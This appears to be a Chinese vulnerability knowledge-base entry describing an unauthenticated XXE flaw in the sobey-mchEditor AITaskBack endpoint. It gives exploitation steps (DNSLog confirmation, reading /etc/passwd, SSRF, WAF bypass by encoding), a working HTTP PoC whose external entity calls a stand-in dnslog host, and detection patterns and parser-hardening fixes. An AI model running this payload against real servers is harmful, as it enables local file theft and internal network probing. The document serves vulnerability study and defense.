---
id: web-generic-xxe-sobey-mcheditor-aitaskback-documentbuilderfactory
title: sobey-mchEditor AITaskBack 未授权 XXE：请求体直接交给 DocumentBuilderFactory 解析
type: scenario
domain: web
path: web/generic/xxe
technique: sobey-mcheditor-aitaskback-documentbuilderfactory-xxe
aliases:
- /sobey-mchEditor/mch/AI/AITaskBack
- AITaskBack XXE
- 融媒体系统 XXE
- AI 智能写稿回调 XXE
- DocumentBuilderFactory 外部实体
- token required=false XXE
tags:
- web
- xxe
- java
- xml
- documentbuilderfactory
- unauth
- oob
- dnslog
- sobey
- mcheditor
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V244
  verified_at: '2026-11-07T13:18:15+08:00'
  notes: 已对照原文与图07-09核对；token/siteCode required=false、IOUtils读请求体、未加固DocumentBuilderFactory解析、DNSLog命中且响应500均一致；未设置versions；PoC未复跑
---

## 一句话结论

`POST /sobey-mchEditor/mch/AI/AITaskBack` 的 `token`、`siteCode` 参数都是 `required = false`，方法把整个请求体读成字符串后交给 `DocumentBuilderFactory.newInstance()` 的默认解析器 `parse()`；未禁用 DOCTYPE 与外部实体，提交带 `SYSTEM` 实体的 XML 即可让服务端发起外带请求（原文用 DNSLog 确认命中），并可进一步用 `file://` 读取本地文件。

## 原理

- 入口是 `/mch/AI` 下的 `AITaskBack`，method 限定 POST。方法签名中 `token` 与 `siteCode` 都标了 `required = false`，不提供 token 也能进入方法；`contentid` 必填但值任意。
- 方法内 `String param = IOUtils.toString(req.getInputStream(), "UTF-8")` 把请求体整体读出，随后创建：
  - `DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance()`
  - `DocumentBuilder db = dbf.newDocumentBuilder()`
  - `Document doc = db.parse(new InputSource(new StringReader(param)))`
- 代码没有调用 `setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`，没有关掉 `external-general-entities` / `external-parameter-entities`，也没有设置 `ACCESS_EXTERNAL_DTD`、`ACCESS_EXTERNAL_SCHEMA` 或空 EntityResolver。默认配置下解析器会处理 DOCTYPE 并展开外部实体。
- 当 XML 中出现 `<!ENTITY xxe SYSTEM "http://attacker/">` 且 body 使用 `&xxe;` 时，解析器为展开实体向该 URL 发起请求，形成 OOB XXE：可用 DNSLog 观察解析是否发生，也可把目标换成内网地址做 SSRF，或用 `file:///etc/passwd` 读取本地文件。
- 解析后代码继续查找 `<TextResult>` 节点，缺失时返回 500；因此响应状态不能作为判断依据，盲 XXE 应以外带通道为准。原文正是请求返回 500，但 DNSLog 记录到了服务端解析产生的 DNS 查询。

## 触发条件

- 目标 sobey-mchEditor 的 `/sobey-mchEditor/mch/AI/AITaskBack` 可达，且未要求有效 token。
- XML 解析器未做安全加固（默认 `DocumentBuilderFactory`），允许 DOCTYPE/外部实体。
- 服务端能向外发起 DNS/HTTP 请求（用于 OOB 确认）；若要读文件，进程需对目标文件有读权限。
- 若前置网关/WAF 拦截 `<!DOCTYPE`/`<!ENTITY`，需要编码或换协议绕过。

## 利用步骤

1. 确认接口可达：不带 token 或 `token=` 空值发送一个普通 XML，观察是否进入解析逻辑（可能返回 500）。
2. 用 DNSLog 生成唯一子域名，提交带外部实体的 XML，观察 DNS 记录是否出现，确认 XXE。
3. 把实体 URL 换成 `file:///etc/passwd`（或 Windows 路径），结合报错回显、日志或参数实体 OOB 外带读取文件。
4. 也可把 `SYSTEM` 指向内网 HTTP 服务，利用解析器请求做 SSRF 探测内网。
5. 若解析结果会被后续逻辑使用，可构造 `<TextResult>` 让流程继续，观察是否把实体内容回显到响应中。

## PoC

最小 OOB 验证：

```http
POST /sobey-mchEditor/mch/AI/AITaskBack?contentid=1&token=&siteCode= HTTP/1.1
Host: target
Content-Type: application/xml
Content-Length: 131

<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://<dnslog-subdomain>">]>
<root><data>&xxe;</data></root>
```

服务端响应可能是 `500`（后续缺少 `<TextResult>` 节点），但 DNSLog 会收到来自目标 IP 的解析记录，即可确认 XXE。文件读取变体把实体值改为 `file:///etc/passwd`，再配合参数实体/OOB 把内容带出。

## 变体与关联

- 变体：参数实体 + 外部 DTD 做文件内容外带；UTF-16/UTF-16BE 编码绕过只匹配 UTF-8 的 WAF；实体 URL 指向内网做 SSRF。
- 变体：把 XML 放在 `Content-Type: application/xml` 或 `text/xml` 均可，关键是后端无条件按 XML 解析请求体。
- 关联：默认解析器导致的本带内文件读取 [[web-generic-xxe-inband-file-read-default-insecure]]；同类型 Java 回调接口 XXE [[web-generic-xxe-whir-ezoffice-weixin-callback-xmlparse]]、[[web-generic-xxe-artery-erp-richclient-openform]]；同系统的上传与 SQL 注入 [[web-generic-file-upload-sobey-mcheditor-watermark-filename-traversal-jsp]]、[[web-generic-sqli-sobey-mcheditor-wxarticlelist-whitelist-bypass]]。
- 边界：解析器显式禁用 DOCTYPE/外部实体、设置 `FEATURE_SECURE_PROCESSING`、`ACCESS_EXTERNAL_DTD` 为空、或替换为空 EntityResolver 时，XXE 不成立；服务端无外网/DNS 时只能用带内回显或错误信息判断。

## 检测与防御

- 检测：请求体含 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`file://`、`http://` 等外部实体特征；应用服务器出现异常出站 DNS/HTTP 请求；解析 XML 的接口返回 500 且伴随可疑请求体。
- 修复：`dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`；关闭 `external-general-entities`、`external-parameter-entities`；设置 `XMLConstants.ACCESS_EXTERNAL_DTD`/`ACCESS_EXTERNAL_SCHEMA` 为空字符串；使用空 EntityResolver。
- 加固：对 AI 回调接口校验 token/签名与来源 IP；限制请求体大小；在网关层拦截 DOCTYPE；XML 解析统一封装安全工厂，禁止业务代码直接 `newInstance()` 默认配置。
